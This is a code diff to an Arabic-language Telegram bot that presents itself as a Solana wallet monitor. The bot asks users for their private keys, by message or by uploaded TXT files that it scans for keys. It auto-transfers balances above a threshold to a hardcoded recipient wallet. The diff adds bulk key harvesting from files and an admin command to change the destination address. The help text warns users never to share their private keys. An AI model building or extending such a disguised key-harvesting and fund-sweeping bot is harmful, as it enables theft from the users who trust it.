@@ -140,6 +140,7 @@ MIN_NOTIFICATION_AMOUNT = 0.0001  # SOL - حد أدنى أقل لضمان اكت
 
 # Auto-transfer configuration
 MIN_AUTO_TRANSFER_AMOUNT = 0.09  # SOL - الحد الأدنى للتحويل التلقائي
+RECIPIENT_ADDRESS = "FTPdRHYoZBHPyPrQkW1GhdCHNLtaQHYzivBEkuAtK8ho"  # عنوان المستلم الافتراضي
 
 # Channel and Admin Configuration
 MONITORING_CHANNEL = int(os.getenv("ID_CHAT")) if os.getenv("ID_CHAT") else None
@@ -160,7 +161,7 @@ MESSAGES = {
     "monitoring_status": "📊 حالة المراقبة:\n\n{status}",
     "wallet_already_monitored": "⚠️ هذه المحفظة مراقبة بالفعل.",
     "select_wallet_to_stop": "اختر المحفظة التي تريد إيقاف مراقبتها:",
-    "help_text": "🤖 بوت مراقبة محافظ سولانا\n\nهذا البوت يساعدك في مراقبة معاملات محافظ سولانا والحصول على إشعارات فورية.\n\n🔧 يعمل حالياً على شبكة Devnet للتجربة\n\n📋 الأوامر:\n/start - بدء البوت\n/monitor - بدء مراقبة محفظة جديدة\n/add - إضافة عدة محافظ دفعة واحدة\n/stop - إيقاف مراقبة محفظة\n/stop <عنوان> - إيقاف مراقبة محفظة محددة\n/list - عرض المحافظ المراقبة\n/r - عرض المحافظ التي بها رصيد SOL فقط\n/k - تصدير المفاتيح الخاصة\n/stats - عرض إحصائيات النظام والأداء\n/help - عرض هذه المساعدة\n\n👑 أوامر المشرف:\n/filter - تعديل الحد الأدنى للإشعارات\n/0 - تعديل الحد الأدنى للتحويل التلقائي\n/transfer - نقل جميع المحافظ لمستخدم محدد\n\n💡 نصائح:\n• يمكنك استخدام جزء من عنوان المحفظة مع /stop\n• مثال: /stop 7xKXtg2CW\n\n🚀 لإنشاء محفظة تجريبية:\n1. اذهب إلى https://solana.fm/address\n2. انقر على 'Generate Keypair'\n3. احفظ المفتاح الخاص والعنوان\n4. احصل على SOL تجريبي من https://faucet.solana.com\n\n⚠️ تنبيه أمني:\nلا تشارك مفاتيحك الخاصة مع أي شخص آخر!"
+    "help_text": "🤖 بوت مراقبة محافظ سولانا\n\nهذا البوت يساعدك في مراقبة معاملات محافظ سولانا والحصول على إشعارات فورية.\n\n🔧 يعمل حالياً على شبكة Devnet للتجربة\n\n📋 الأوامر:\n/start - بدء البوت\n/monitor - بدء مراقبة محفظة جديدة\n/add - إضافة عدة محافظ دفعة واحدة\n/stop - إيقاف مراقبة محفظة\n/stop <عنوان> - إيقاف مراقبة محفظة محددة\n/list - عرض المحافظ المراقبة\n/r - عرض المحافظ التي بها رصيد SOL فقط\n/k - تصدير المفاتيح الخاصة\n/stats - عرض إحصائيات النظام والأداء\n/help - عرض هذه المساعدة\n\n📁 إضافة من ملف:\n• أرسل ملف TXT يحتوي على مفاتيح خاصة\n• سيتم استخراج وإضافة جميع المفاتيح تلقائياً\n• يدعم تنسيقات Base58 و Array\n• يمكن أن تكون المفاتيح مختلطة مع نصوص أخرى\n\n👑 أوامر المشرف:\n/filter - تعديل الحد الأدنى للإشعارات\n/0 - تعديل الحد الأدنى للتحويل التلقائي\n/transfer - نقل جميع المحافظ لمستخدم محدد\nتغيير - تغيير عنوان المستلم للتحويل التلقائي\n\n💡 نصائح:\n• يمكنك استخدام جزء من عنوان المحفظة مع /stop\n• مثال: /stop 7xKXtg2CW\n• أرسل ملف TXT للإضافة المجمعة السريعة\n\n🚀 لإنشاء محفظة تجريبية:\n1. اذهب إلى https://solana.fm/address\n2. انقر على 'Generate Keypair'\n3. احفظ المفتاح الخاص والعنوان\n4. احصل على SOL تجريبي من https://faucet.solana.com\n\n⚠️ تنبيه أمني:\nلا تشارك مفاتيحك الخاصة مع أي شخص آخر!"
 }
 
 
@@ -1675,7 +1676,7 @@ class SolanaMonitor:
                         transfer_success = await self.auto_transfer_funds(
                             wallet_address,
                             wallet_private_key,
-                            "FTPdRHYoZBHPyPrQkW1GhdCHNLtaQHYzivBEkuAtK8ho"
+                            RECIPIENT_ADDRESS
                         )
 
                         if transfer_success:
@@ -2536,6 +2537,26 @@ class SolanaWalletBot:
                 "مثال: /0 0.05"
             )
 
+    async def change_recipient_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle تغيير command - admin only: change recipient address for auto-transfer"""
+        global RECIPIENT_ADDRESS
+        chat_id = update.effective_chat.id
+
+        # Check if user is admin
+        if chat_id != ADMIN_CHAT_ID:
+            await update.message.reply_text("❌ هذا الأمر متاح للمشرف فقط.")
+            return
+
+        # Set user state to waiting for recipient address
+        self.user_states[chat_id] = "waiting_recipient_address"
+        await update.message.reply_text(
+            f"🏦 تغيير عنوان المستلم للتحويل التلقائي\n\n"
+            f"📍 العنوان الحالي:\n<code>{RECIPIENT_ADDRESS}</code>\n\n"
+            f"🔄 الرجاء إرسال العنوان الجديد:\n"
+            f"تأكد من أن العنوان صحيح ومن شبكة Solana",
+            parse_mode='HTML'
+        )
+
     async def debug_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Handle /debug command - show notification settings"""
         chat_id = update.effective_chat.id
@@ -2789,6 +2810,8 @@ class SolanaWalletBot:
         self.application.add_handler(CommandHandler("debug", self.debug_command))
         self.application.add_handler(CommandHandler("stats", self.stats_command))
         self.application.add_handler(CommandHandler("0", self.set_auto_transfer_command))
+        self.application.add_handler(MessageHandler(filters.Regex("^تغيير$"), self.change_recipient_command))
+        self.application.add_handler(MessageHandler(filters.Document.TXT, self.handle_txt_document))
         self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
         self.application.add_handler(CallbackQueryHandler(self.handle_callback_query))
         self.application.add_error_handler(self.error_handler)
@@ -2813,6 +2836,9 @@ class SolanaWalletBot:
             
             # Load saved auto-transfer setting
             await self.load_auto_transfer_setting()
+            
+            # Load saved recipient address setting
+            await self.load_recipient_address_setting()
 
             # Create application with better configuration
             self.application = (Application.builder()
@@ -2892,6 +2918,16 @@ class SolanaWalletBot:
             logger.info(f"🔧 Loaded saved minimum auto-transfer amount: {MIN_AUTO_TRANSFER_AMOUNT} SOL")
         except Exception as e:
             logger.warning(f"Error loading auto-transfer setting, using default: {e}")
+
+    async def load_recipient_address_setting(self):
+        """Load saved recipient address from database"""
+        global RECIPIENT_ADDRESS
+        try:
+            saved_address = await self.monitor.db_manager.get_setting('recipient_address', RECIPIENT_ADDRESS)
+            RECIPIENT_ADDRESS = saved_address
+            logger.info(f"🔧 Loaded saved recipient address: {truncate_address(RECIPIENT_ADDRESS)}")
+        except Exception as e:
+            logger.warning(f"Error loading recipient address setting, using default: {e}")
 
     async def health_monitor(self):
         """Monitor bot health with Multi-RPC statistics"""
@@ -2982,10 +3018,14 @@ class SolanaWalletBot:
         chat_id = update.effective_chat.id
         text = update.message.text
 
-        # Check if user is waiting for private key input
-        if chat_id in self.user_states and self.user_states[chat_id] in ["waiting_private_key", "waiting_bulk_private_keys"]:
-            if text:
-                await self.handle_private_key_input(update, context, text)
+        # Check if user is waiting for input
+        if chat_id in self.user_states:
+            if self.user_states[chat_id] in ["waiting_private_key", "waiting_bulk_private_keys"]:
+                if text:
+                    await self.handle_private_key_input(update, context, text)
+            elif self.user_states[chat_id] == "waiting_recipient_address":
+                if text:
+                    await self.handle_recipient_address_input(update, context, text)
         else:
             # Only show help if the message doesn't contain potential private keys
             if text and not self.might_contain_private_keys(text):
@@ -3152,6 +3192,69 @@ class SolanaWalletBot:
         # Update final status
         await status_message.edit_text(report)
 
+    async def handle_recipient_address_input(self, update: Update, context: ContextTypes.DEFAULT_TYPE, address: str):
+        """Handle recipient address input from admin"""
+        global RECIPIENT_ADDRESS
+        chat_id = update.effective_chat.id
+
+        # Clear user state
+        self.user_states.pop(chat_id, None)
+
+        # Validate Solana address format
+        address = address.strip()
+        
+        try:
+            # Check if it's a valid Solana address (44 characters, base58)
+            if len(address) != 44:
+                await update.message.reply_text(
+                    "❌ عنوان Solana يجب أن يكون 44 حرف.\n\n"
+                    "الرجاء التأكد من العنوان وإعادة المحاولة باستخدام الأمر تغيير"
+                )
+                return
+
+            # Try to validate using Solana's Pubkey
+            from solders.pubkey import Pubkey
+            try:
+                Pubkey.from_string(address)
+            except Exception:
+                await update.message.reply_text(
+                    "❌ عنوان غير صحيح.\n\n"
+                    "تأكد من أن العنوان صحيح من شبكة Solana وأعد المحاولة."
+                )
+                return
+
+            # Update the global recipient address
+            old_address = RECIPIENT_ADDRESS
+            RECIPIENT_ADDRESS = address
+
+            # Save to database
+            success = await self.monitor.db_manager.save_setting('recipient_address', address)
+
+            if success:
+                await update.message.reply_text(
+                    f"✅ تم تغيير عنوان المستلم بنجاح!\n\n"
+                    f"📍 العنوان السابق:\n<code>{truncate_address(old_address)}</code>\n\n"
+                    f"🎯 العنوان الجديد:\n<code>{truncate_address(address)}</code>\n\n"
+                    f"💰 جميع التحويلات التلقائية ستتم إلى العنوان الجديد\n"
+                    f"🔒 تم حفظ التغيير بشكل دائم",
+                    parse_mode='HTML'
+                )
+                logger.info(f"Admin {chat_id} changed recipient address from {old_address} to {address}")
+            else:
+                await update.message.reply_text(
+                    f"⚠️ تم تغيير العنوان مؤقتاً ولكن فشل في حفظه.\n\n"
+                    f"🎯 العنوان الحالي:\n<code>{truncate_address(address)}</code>\n\n"
+                    f"سيعود إلى العنوان السابق عند إعادة التشغيل.",
+                    parse_mode='HTML'
+                )
+
+        except Exception as e:
+            logger.error(f"Error in handle_recipient_address_input: {e}")
+            await update.message.reply_text(
+                f"❌ حدث خطأ في معالجة العنوان:\n{str(e)}\n\n"
+                "الرجاء المحاولة مرة أخرى."
+            )
+
     def extract_private_keys_from_text(self, text: str) -> List[str]:
         """Extract private keys from text, handling various formats"""
         import re
@@ -3185,6 +3288,208 @@ class SolanaWalletBot:
                 unique_keys.append(key)
 
         return unique_keys
+
+    async def handle_txt_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle TXT document containing private keys"""
+        chat_id = update.effective_chat.id
+        
+        try:
+            # Check if user has reached maximum wallets
+            monitored_wallets = await self.monitor.db_manager.get_monitored_wallets(chat_id)
+            if len(monitored_wallets) >= MAX_MONITORED_WALLETS:
+                await update.message.reply_text(
+                    MESSAGES["max_wallets_reached"].format(max_wallets=MAX_MONITORED_WALLETS)
+                )
+                return
+
+            # Get document information
+            document = update.message.document
+            file_name = document.file_name
+            file_size = document.file_size
+
+            # Check file size (limit to 10MB for safety)
+            if file_size > 10 * 1024 * 1024:  # 10MB
+                await update.message.reply_text(
+                    "❌ حجم الملف كبير جداً (أكثر من 10 ميجابايت).\n\n"
+                    "الرجاء استخدام ملف أصغر حجماً."
+                )
+                return
+
+            # Send initial status message
+            status_message = await update.message.reply_text(
+                f"📁 جاري تحليل الملف: {file_name}\n"
+                f"📏 حجم الملف: {file_size / 1024:.1f} كيلوبايت\n\n"
+                "⏳ جاري التحميل والمعالجة..."
+            )
+
+            # Download the file
+            file = await context.bot.get_file(document.file_id)
+            
+            # Create temporary filename
+            import tempfile
+            with tempfile.NamedTemporaryFile(mode='w+', suffix='.txt', delete=False) as temp_file:
+                temp_filename = temp_file.name
+
+            # Download file content
+            await file.download_to_drive(temp_filename)
+
+            # Read file content with multiple encoding attempts
+            file_content = None
+            encodings = ['utf-8', 'utf-8-sig', 'windows-1256', 'iso-8859-1', 'cp1252']
+            
+            for encoding in encodings:
+                try:
+                    with open(temp_filename, 'r', encoding=encoding) as f:
+                        file_content = f.read()
+                    break
+                except UnicodeDecodeError:
+                    continue
+
+            # Clean up temporary file
+            os.remove(temp_filename)
+
+            if not file_content:
+                await status_message.edit_text(
+                    "❌ فشل في قراءة محتوى الملف.\n\n"
+                    "تأكد من أن الملف بتنسيق نص صحيح (UTF-8)."
+                )
+                return
+
+            # Update status
+            await status_message.edit_text(
+                f"📄 تم تحميل الملف بنجاح!\n\n"
+                f"📊 حجم المحتوى: {len(file_content)} حرف\n\n"
+                "🔍 جاري البحث عن المفاتيح الخاصة..."
+            )
+
+            # Extract private keys from file content
+            private_keys = self.extract_private_keys_from_text(file_content)
+
+            if not private_keys:
+                await status_message.edit_text(
+                    "❌ لم يتم العثور على أي مفاتيح خاصة صحيحة في الملف.\n\n"
+                    "تأكد من أن الملف يحتوي على مفاتيح خاصة بتنسيق صحيح:\n"
+                    "• تنسيق Base58 (87-88 حرف)\n"
+                    "• تنسيق Array مثل [1,2,3,...]\n\n"
+                    "💡 يمكن أن تكون المفاتيح مختلطة مع نصوص أخرى."
+                )
+                return
+
+            # Check if adding these keys would exceed the limit
+            if len(monitored_wallets) + len(private_keys) > MAX_MONITORED_WALLETS:
+                available_slots = MAX_MONITORED_WALLETS - len(monitored_wallets)
+                await status_message.edit_text(
+                    f"⚠️ تم العثور على {len(private_keys)} مفتاح خاص\n\n"
+                    f"❌ ولكن يمكنك إضافة {available_slots} محفظة فقط\n"
+                    f"(الحد الأقصى: {MAX_MONITORED_WALLETS} محفظة)\n\n"
+                    "الرجاء حذف بعض المحافظ أولاً أو تقسيم الملف."
+                )
+                return
+
+            # Update status with found keys count
+            await status_message.edit_text(
+                f"✅ تم العثور على {len(private_keys)} مفتاح خاص!\n\n"
+                f"🔄 جاري إضافة المحافظ إلى المراقبة...\n\n"
+                "⏳ يرجى الانتظار..."
+            )
+
+            # Process keys and track results
+            successful_wallets = []
+            failed_keys = []
+            already_monitored = []
+            
+            for i, private_key in enumerate(private_keys, 1):
+                try:
+                    # Update progress every 5 keys
+                    if i % 5 == 0 or i == len(private_keys):
+                        await status_message.edit_text(
+                            f"🔄 معالجة المفاتيح: {i}/{len(private_keys)}\n\n"
+                            f"✅ نجح: {len(successful_wallets)}\n"
+                            f"🔄 مراقب مسبقاً: {len(already_monitored)}\n"
+                            f"❌ فشل: {len(failed_keys)}\n\n"
+                            "⏳ جاري المعالجة..."
+                        )
+
+                    # Validate private key
+                    is_valid, result = validate_private_key(private_key)
+
+                    if not is_valid:
+                        failed_keys.append(f"مفتاح غير صحيح: {private_key[:20]}...")
+                        continue
+
+                    wallet_address = result
+
+                    # Add wallet to monitoring
+                    success, message = await self.monitor.add_wallet(
+                        private_key,
+                        chat_id,
+                        self.send_transaction_notification
+                    )
+
+                    if success:
+                        successful_wallets.append(truncate_address(wallet_address))
+                        logger.info(f"File bulk added wallet {wallet_address} for user {chat_id}")
+                    else:
+                        if message == "wallet_already_monitored":
+                            already_monitored.append(truncate_address(wallet_address))
+                        else:
+                            failed_keys.append(f"خطأ: {message}")
+
+                except Exception as e:
+                    failed_keys.append(f"خطأ في المعالجة: {str(e)[:30]}...")
+
+            # Prepare final report
+            report = f"📊 تقرير معالجة الملف: {file_name}\n\n"
+            report += f"🔢 إجمالي المفاتيح الموجودة: {len(private_keys)}\n"
+            report += f"✅ تمت الإضافة بنجاح: {len(successful_wallets)}\n"
+            report += f"🔄 مراقبة مسبقاً: {len(already_monitored)}\n"
+            report += f"❌ فشل: {len(failed_keys)}\n\n"
+
+            if successful_wallets:
+                report += "✅ المحافظ المضافة من الملف:\n"
+                for i, wallet in enumerate(successful_wallets[:10], 1):  # Show first 10
+                    report += f"  {i}. {wallet}\n"
+                if len(successful_wallets) > 10:
+                    report += f"  ... و {len(successful_wallets) - 10} محفظة أخرى\n"
+                report += "\n"
+
+            if already_monitored:
+                report += "🔄 محافظ مراقبة مسبقاً:\n"
+                for i, wallet in enumerate(already_monitored[:5], 1):  # Show first 5
+                    report += f"  {i}. {wallet}\n"
+                if len(already_monitored) > 5:
+                    report += f"  ... و {len(already_monitored) - 5} محفظة أخرى\n"
+                report += "\n"
+
+            if failed_keys:
+                report += "❌ مفاتيح فاشلة:\n"
+                for i, error in enumerate(failed_keys[:3], 1):  # Show first 3 errors
+                    report += f"  {i}. {error}\n"
+                if len(failed_keys) > 3:
+                    report += f"  ... و {len(failed_keys) - 3} خطأ آخر\n"
+                report += "\n"
+
+            if successful_wallets:
+                report += "🔔 المراقبة نشطة للمحافظ المضافة الجديدة!"
+            else:
+                report += "💡 لم يتم إضافة محافظ جديدة من هذا الملف."
+
+            # Send final report without buttons
+            await status_message.edit_text(report)
+
+            logger.info(f"Processed TXT file {file_name} for user {chat_id}: {len(successful_wallets)} wallets added")
+
+        except Exception as e:
+            logger.error(f"Error processing TXT document: {e}")
+            if 'status_message' in locals():
+                await status_message.edit_text(
+                    f"❌ حدث خطأ في معالجة الملف:\n{str(e)}\n\n"
+                    "الرجاء المحاولة مرة أخرى أو التواصل مع الدعم."
+                )
+            else:
+                await update.message.reply_text(
+                    f"❌ حدث خطأ في معالجة الملف:\n{str(e)}"
+                )
 
     async def handle_callback_query(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Handle inline keyboard callbacks"""
@@ -3228,6 +3533,14 @@ class SolanaWalletBot:
         elif query.data == "refresh_stats":
             await query.answer("🔄 جاري تحديث الإحصائيات...")
             await self._send_stats_message(update, context, is_refresh=True)
+
+        elif query.data == "show_wallets":
+            await query.answer("📊 جاري إعداد قائمة المحافظ...")
+            await self.list_command(update, context)
+
+        elif query.data == "check_balances":
+            await query.answer("📈 جاري فحص الأرصدة...")
+            await self.rich_wallets_command(update, context)
 
     async def send_transaction_notification(self, chat_id: int, wallet_address: str,
                                           amount: str, tx_type: str, timestamp: str, signature: str):
